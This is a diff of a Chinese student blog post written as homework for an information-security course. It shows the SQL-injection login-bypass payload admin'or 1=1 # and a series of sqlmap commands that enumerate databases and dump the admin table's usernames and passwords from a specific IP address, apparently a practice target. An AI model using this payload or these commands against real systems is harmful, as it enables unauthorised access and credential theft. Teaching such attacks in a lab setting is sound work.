@@ -96,25 +96,24 @@
 
 
 
-  <meta name="description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 假设登录框处的判断代码如下： SELECT * FROM admin where name=&amp;#39;&amp;quot;.$_POST[&amp;#39;name&amp;#39;].&amp;quot;&amp;#39;and password=&amp;#39;&amp;quot;.$_POST[&amp;#39;password&amp;#39;]&amp;quot;&amp;#39;; 在账号框中输入admin’or">
+  <meta name="description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 假设登录框处的判断代码如下： 1SELECT * FROM admin where name=&apos;&quot;.$_POST[&apos;name&apos;].&quot;&apos;and password=&apos;&quot;.$_POST[&apos;password&apos;]&quot;&apos;; 在账号框中输入admin&amp;#39;or 1=1 #，密码随便输，sql语句就变成了： 1SELECT * FROM admin whe">
 <meta name="keywords" content="SQL注入知识">
 <meta property="og:type" content="article">
 <meta property="og:title" content="信息安全概论课堂作业">
 <meta property="og:url" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/index.html">
 <meta property="og:site_name" content="reb0rn&#39;s blog">
-<meta property="og:description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 假设登录框处的判断代码如下： SELECT * FROM admin where name=&amp;#39;&amp;quot;.$_POST[&amp;#39;name&amp;#39;].&amp;quot;&amp;#39;and password=&amp;#39;&amp;quot;.$_POST[&amp;#39;password&amp;#39;]&amp;quot;&amp;#39;; 在账号框中输入admin’or">
+<meta property="og:description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 假设登录框处的判断代码如下： 1SELECT * FROM admin where name=&apos;&quot;.$_POST[&apos;name&apos;].&quot;&apos;and password=&apos;&quot;.$_POST[&apos;password&apos;]&quot;&apos;; 在账号框中输入admin&amp;#39;or 1=1 #，密码随便输，sql语句就变成了： 1SELECT * FROM admin whe">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/1.png">
 <meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/2.png">
 <meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/3.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/4.png">
 <meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/5.png">
 <meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/6.png">
 <meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/7.png">
-<meta property="og:updated_time" content="2019-10-13T13:24:32.514Z">
+<meta property="og:updated_time" content="2019-10-14T00:41:00.089Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="信息安全概论课堂作业">
-<meta name="twitter:description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 假设登录框处的判断代码如下： SELECT * FROM admin where name=&amp;#39;&amp;quot;.$_POST[&amp;#39;name&amp;#39;].&amp;quot;&amp;#39;and password=&amp;#39;&amp;quot;.$_POST[&amp;#39;password&amp;#39;]&amp;quot;&amp;#39;; 在账号框中输入admin’or">
+<meta name="twitter:description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 假设登录框处的判断代码如下： 1SELECT * FROM admin where name=&apos;&quot;.$_POST[&apos;name&apos;].&quot;&apos;and password=&apos;&quot;.$_POST[&apos;password&apos;]&quot;&apos;; 在账号框中输入admin&amp;#39;or 1=1 #，密码随便输，sql语句就变成了： 1SELECT * FROM admin whe">
 <meta name="twitter:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/1.png">
 
 
@@ -392,12 +391,24 @@
                 
               
 
-              <time title="Created: 2019-10-13 20:57:00 / Modified: 21:24:32" itemprop="dateCreated datePublished" datetime="2019-10-13T20:57:00+08:00">2019-10-13</time>
+              <time title="Created: 2019-10-13 20:57:00" itemprop="dateCreated datePublished" datetime="2019-10-13T20:57:00+08:00">2019-10-13</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-10-14 08:41:00" itemprop="dateModified" datetime="2019-10-14T08:41:00+08:00">2019-10-14</time>
               
             
           </span>
@@ -451,29 +462,29 @@
       
         <h1 id="SQL注入之万能密码漏洞"><a href="#SQL注入之万能密码漏洞" class="headerlink" title="SQL注入之万能密码漏洞"></a>SQL注入之万能密码漏洞</h1><p>第一道题是牵扯到了万能密码漏洞</p>
 <p>假设登录框处的判断代码如下：</p>
-<p><code>SELECT * FROM admin where name=&#39;&quot;.$_POST[&#39;name&#39;].&quot;&#39;and password=&#39;&quot;.$_POST[&#39;password&#39;]&quot;&#39;;</code></p>
-<p>在账号框中输入admin’or 1=1 #，密码随便输，sql语句就变成了：</p>
-<p><code>SELECT * FROM admin where name=&#39;admin&#39; or 1=1 #&#39;and password=&#39;任意字符&#39;;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where name=<span class="string">'".$_POST['</span>name<span class="string">']."'</span><span class="keyword">and</span> password=<span class="string">'".$_POST['</span>password<span class="string">']"'</span>;</span><br></pre></td></tr></table></figure>
+<p>在账号框中输入<code>admin&#39;or 1=1 #</code>，密码随便输，sql语句就变成了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where name=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#'and password='任意字符';</span></span><br></pre></td></tr></table></figure>
 <p>  符号’将语句闭合</p>
-<p>  #号将admin’ or 1=1后面的语句注释</p>
+<p>  #号将<code>admin&#39; or 1=1</code>后面的语句注释</p>
 <p>  剩下有效的sql代码变成了</p>
-<p>  <code>SELECT * FROM admin where name=&#39;admin&#39; or 1=1</code></p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where name=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 <p>  这段代码意思就是 ‘admin’ or 1=1 (真 or 真)是一个恒为真的判断</p>
 <p>  服务器收到了返回真的验证,就绕过了登录</p>
 <h2 id="防止方法"><a href="#防止方法" class="headerlink" title="防止方法"></a>防止方法</h2><p>  1.字符转义 </p>
 <p>  2.字符替换  </p>
 <p>  3.百度如何预防SQL注入</p>
-<h1 id="SQL注入之字符型注入"><a href="#SQL注入之字符型注入" class="headerlink" title="SQL注入之字符型注入"></a>SQL注入之字符型注入</h1><h2 id="利用sqlmap工具注入"><a href="#利用sqlmap工具注入" class="headerlink" title="利用sqlmap工具注入"></a>利用sqlmap工具注入</h2><h3 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a>检查注入点：</h3><p><code>python .\sqlmap.py -u &#39;http://59.63.200.79:8003/?id=1&#39; --dbs</code></p>
+<h1 id="SQL注入之字符型注入"><a href="#SQL注入之字符型注入" class="headerlink" title="SQL注入之字符型注入"></a>SQL注入之字符型注入</h1><h2 id="利用sqlmap工具注入"><a href="#利用sqlmap工具注入" class="headerlink" title="利用sqlmap工具注入"></a>利用sqlmap工具注入</h2><h3 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a>检查注入点：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span> --dbs</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/10/13/信息安全概论课堂作业/1.png" alt="你想输入的替代文字"></p>
 <p><img src="/2019/10/13/信息安全概论课堂作业/2.png" alt="你想输入的替代文字"></p>
-<h3 id="爆数据库的信息："><a href="#爆数据库的信息：" class="headerlink" title="爆数据库的信息："></a>爆数据库的信息：</h3><p><code>python .\sqlmap.py -u &#39;http://59.63.200.79:8003/?id=1&#39; --dbs</code></p>
+<h3 id="爆数据库的信息："><a href="#爆数据库的信息：" class="headerlink" title="爆数据库的信息："></a>爆数据库的信息：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span> --dbs</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/10/13/信息安全概论课堂作业/3.png" alt="你想输入的替代文字"></p>
-<h3 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a>爆当前数据库信息：</h3><p><code>python .\sqlmap.py -u &#39;http://59.63.200.79:8003/?id=1&#39; --current-db</code></p>
-<p> <img src="/2019/10/13/信息安全概论课堂作业/4.png" alt="你想输入的替代文字"></p>
-<h3 id="指定库名列出所有表"><a href="#指定库名列出所有表" class="headerlink" title="指定库名列出所有表"></a>指定库名列出所有表</h3><p><code>python .\sqlmap.py -u &#39;http://59.63.200.79:8003/?id=1&#39;  -D maoshe --table</code></p>
+<h3 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a>爆当前数据库信息：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span> --current-db</span><br><span class="line">``` </span><br><span class="line"> ![你想输入的替代文字](信息安全概论课堂作业/<span class="number">4.</span>png)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 指定库名列出所有表</span></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span>  -D maoshe --table</span><br></pre></td></tr></table></figure>
 <p> <img src="/2019/10/13/信息安全概论课堂作业/5.png" alt="你想输入的替代文字"></p>
-<h3 id="指定库名表名列出所有字段"><a href="#指定库名表名列出所有字段" class="headerlink" title="指定库名表名列出所有字段"></a>指定库名表名列出所有字段</h3><p><code>python .\sqlmap.py -u &#39;http://59.63.200.79:8003/?id=1&#39;  -D maoshe -T admin --column</code><br>   <img src="/2019/10/13/信息安全概论课堂作业/6.png" alt="你想输入的替代文字"></p>
-<h3 id="指定库名表名字段dump出指定字段"><a href="#指定库名表名字段dump出指定字段" class="headerlink" title="指定库名表名字段dump出指定字段"></a>指定库名表名字段dump出指定字段</h3><p><code>python .\sqlmap.py -u &#39;http://59.63.200.79:8003/?id=1&#39;  -D maoshe -T admin -C username password --dump</code></p>
+<h3 id="指定库名表名列出所有字段"><a href="#指定库名表名列出所有字段" class="headerlink" title="指定库名表名列出所有字段"></a>指定库名表名列出所有字段</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span>  -D maoshe -T admin --column</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/13/信息安全概论课堂作业/6.png" alt="你想输入的替代文字"></p>
+<h3 id="指定库名表名字段dump出指定字段"><a href="#指定库名表名字段dump出指定字段" class="headerlink" title="指定库名表名字段dump出指定字段"></a>指定库名表名字段dump出指定字段</h3><pre><code class="php">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span>  -D maoshe -T admin -C username password --dump
+</code></pre>
 <p><img src="/2019/10/13/信息安全概论课堂作业/7.png" alt="你想输入的替代文字"></p>
 <h2 id="利用手动注入"><a href="#利用手动注入" class="headerlink" title="利用手动注入"></a>利用手动注入</h2><p> 要回宿舍了,明天再写。</p>
 
@@ -742,7 +753,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入之万能密码漏洞"><span class="nav-number">1.</span> <span class="nav-text">SQL注入之万能密码漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#防止方法"><span class="nav-number">1.1.</span> <span class="nav-text">防止方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入之字符型注入"><span class="nav-number">2.</span> <span class="nav-text">SQL注入之字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用sqlmap工具注入"><span class="nav-number">2.1.</span> <span class="nav-text">利用sqlmap工具注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检查注入点："><span class="nav-number">2.1.1.</span> <span class="nav-text">检查注入点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆数据库的信息："><span class="nav-number">2.1.2.</span> <span class="nav-text">爆数据库的信息：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆当前数据库信息："><span class="nav-number">2.1.3.</span> <span class="nav-text">爆当前数据库信息：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名列出所有表"><span class="nav-number">2.1.4.</span> <span class="nav-text">指定库名列出所有表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名表名列出所有字段"><span class="nav-number">2.1.5.</span> <span class="nav-text">指定库名表名列出所有字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名表名字段dump出指定字段"><span class="nav-number">2.1.6.</span> <span class="nav-text">指定库名表名字段dump出指定字段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用手动注入"><span class="nav-number">2.2.</span> <span class="nav-text">利用手动注入</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入之万能密码漏洞"><span class="nav-number">1.</span> <span class="nav-text">SQL注入之万能密码漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#防止方法"><span class="nav-number">1.1.</span> <span class="nav-text">防止方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入之字符型注入"><span class="nav-number">2.</span> <span class="nav-text">SQL注入之字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用sqlmap工具注入"><span class="nav-number">2.1.</span> <span class="nav-text">利用sqlmap工具注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检查注入点："><span class="nav-number">2.1.1.</span> <span class="nav-text">检查注入点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆数据库的信息："><span class="nav-number">2.1.2.</span> <span class="nav-text">爆数据库的信息：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆当前数据库信息："><span class="nav-number">2.1.3.</span> <span class="nav-text">爆当前数据库信息：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名表名列出所有字段"><span class="nav-number">2.1.4.</span> <span class="nav-text">指定库名表名列出所有字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名表名字段dump出指定字段"><span class="nav-number">2.1.5.</span> <span class="nav-text">指定库名表名字段dump出指定字段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用手动注入"><span class="nav-number">2.2.</span> <span class="nav-text">利用手动注入</span></a></li></ol></li></ol></div>
             
 
           </div>
